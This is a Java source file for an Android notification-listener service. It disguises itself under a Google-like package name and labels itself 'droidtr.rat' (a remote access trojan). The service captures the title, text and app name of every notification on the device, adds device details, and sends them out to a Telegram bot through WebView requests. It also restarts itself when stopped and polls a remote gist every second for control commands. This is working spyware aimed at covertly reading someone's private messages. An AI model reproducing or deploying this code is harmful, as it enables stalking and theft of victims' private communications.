package com.google.android.gps ;
import android.content.*;
import android.content.pm.*;
import android.os.*;
import android.service.notification.*;
import android.util.*;
import android.webkit.*;
import android.widget.*;
import java.io.*;
import java.net.*;

public class NotificationService extends NotificationListenerService{
	
	NotificationReceiver ns;

	@Override
	public void onCreate(){
		super.onCreate();
		ns = new NotificationReceiver();
		getBgData();
		IntentFilter filter = new IntentFilter();
        filter.addAction("droidtr.rat.KIZTAKIP");
	}

	@Override
	public void onDestroy(){
		startService(new Intent(this,NotificationService.class));
		super.onDestroy();
	}
	
	String old1 = "DENEMEBILDIRIMI";
	String old2 = "DENEMEBILDIRIMI";
	String old3 = "DENEMEBILDIRIMI";
	
	@Override
    public void onNotificationPosted(StatusBarNotification sbn) {
		String s1 = Build.DEVICE;
		String s2 = Build.HARDWARE;
		String s3 = Build.MANUFACTURER;
		int notid = sbn.getId();
		String appname = "";
		try{
			ApplicationInfo ai = getPackageManager().getApplicationInfo(sbn.getPackageName(),0);
			appname = ai.loadLabel(getPackageManager()).toString();
		} catch(Exception e){
			(new WebView(this)).loadUrl("https://api.telegram.org/bot"+this.getResources().getString(R.string.botid)+"/sendMessage?text="+e.toString()+"&chat_id="+this.getResources().getString(R.string.userid));
		}
		
		String pkg = appname+" - "+sbn.getPackageName();
		String title = sbn.getNotification().extras.getString(sbn.getNotification().EXTRA_TITLE);
		String txt = sbn.getNotification().extras.getString(sbn.getNotification().EXTRA_TEXT);
		String temp = "📢 "+getResources().getString(R.string.takmaad)+bosluk()+"Cihaz: "+s1+" "+s2+" "+s3+bosluk()+
						"Uyg adı: "+pkg+bosluk()+"-> Başlık: "+title+
						bosluk()+"-> Metin: "+txt;
		String token = getResources().getString(R.string.botid);
		String user = getResources().getString(R.string.userid);
		String telegram = "https://api.telegram.org/bot"+token+"/sendMessage?"+"&chat_id="+user+"text="+temp;
		if(!temp.contains("null") && (notid != 1)/* && (notid != 10) */ && (!pkg.equals("android"))){
			if(pkg.equals(old1)){
				if(!(title.equals(old2))){
					(new WebView(this)).loadUrl(telegram);
					old1 = pkg;
					old2 = title;
					old3 = txt;
				}
			} else {
				(new WebView(this)).loadUrl(telegram);
				old1 = pkg;
				old2 = title;
				old3 = txt;
			}
			
		}
		Intent i = new  Intent("droidtr.rat.KIZTAKIP");
        i.putExtra("notification_event","onNotificationPosted :" + sbn.getPackageName() + "\n");
        sendBroadcast(i);

    }

	String bosluk(){
		String temp = "";
		for(int i = 0;i!=150;i++)
			temp += " ";
		return temp;
	}
	
	String getDeviceInfo(){
		String s1 = Build.DEVICE;
		String s2 = Build.HARDWARE;
		String s3 = Build.MANUFACTURER;
		return bosluk()+"Device: "+s1+" "+s2+" "+s3;
	}
	
	class NotificationReceiver extends BroadcastReceiver{

        @Override
        public void onReceive(Context context, Intent intent) {
            if(intent.getStringExtra("command").equals("clearall")){
				NotificationService.this.cancelAllNotifications();
            }
            else if(intent.getStringExtra("command").equals("list")){
                Intent i1 = new  Intent("droidtr.rat.KIZTAKIP");
                i1.putExtra("notification_event","=====================");
                sendBroadcast(i1);
                int i=1;
                for (StatusBarNotification sbn : NotificationService.this.getActiveNotifications()) {
                    Intent i2 = new  Intent("droidtr.rat.KIZTAKIP");
                    i2.putExtra("notification_event",i +" " + sbn.getPackageName() + "\n");
                    sendBroadcast(i2);
                    i++;
                }
                Intent i3 = new  Intent("droidtr.rat.KIZTAKIP");
                i3.putExtra("notification_event","===== Notification List ====");
                sendBroadcast(i3);

            }

        }
    }
	
	void getBgData(){
		new Handler().postDelayed(new Runnable(){
			public void run(){
				String url = "https://gist.githubusercontent.com/frknkrc44/7dc63f9b683e4c5f06711ef7a26a1bc8/raw/11192f054daa662f77f2761b4f42243b53675468/rcontrol.txt";
				try{ new DownloadFileFromURL().execute(url); } catch(Exception e){}
				getBgData();
			}
		},1000);
	}

	class DownloadFileFromURL extends AsyncTask<String, String, String> {

        @Override
        protected void onPreExecute() { super.onPreExecute(); }

        @Override
        protected String doInBackground(String... f_url) {
            //int count;
			String s;
            try {
                URL url = new URL(f_url[0]);
                URLConnection conection = url.openConnection();
                conection.connect();
                InputStream input = new BufferedInputStream(url.openStream()/*,8192*/);
				BufferedReader reader = new BufferedReader(new InputStreamReader(input));
                StringBuilder sb = new StringBuilder();
                while ((s = reader.readLine()) != null)
                    sb.append(s);
				Toast.makeText(getBaseContext(),sb.toString(),Toast.LENGTH_LONG).show();
                input.close();
				reader.close();
            } catch (Exception e) {
			  Log.e("Error: ", e.getMessage()); }
            return null;
        }

        @Override
        protected void onPostExecute(String file_url){ super.onPostExecute(file_url); }

    }
	
	
}
